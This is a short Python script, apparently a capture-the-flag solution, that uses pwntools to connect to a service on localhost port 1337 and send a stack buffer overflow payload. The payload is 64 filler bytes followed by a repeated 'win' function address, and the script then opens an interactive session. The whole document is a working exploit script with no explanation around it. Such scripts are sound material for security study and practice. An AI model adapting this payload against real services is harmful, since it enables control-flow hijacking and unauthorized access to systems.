from pwn import *

io = remote("localhost", 1337)

print(io.recvuntil(b"data:").decode())

win_addr = p64(0x00400668)
payload = b"A"*64 + win_addr*8

io.send(payload)

response = io.recvline()
print(response.decode(errors='ignore'))

io.interactive()

io.close()
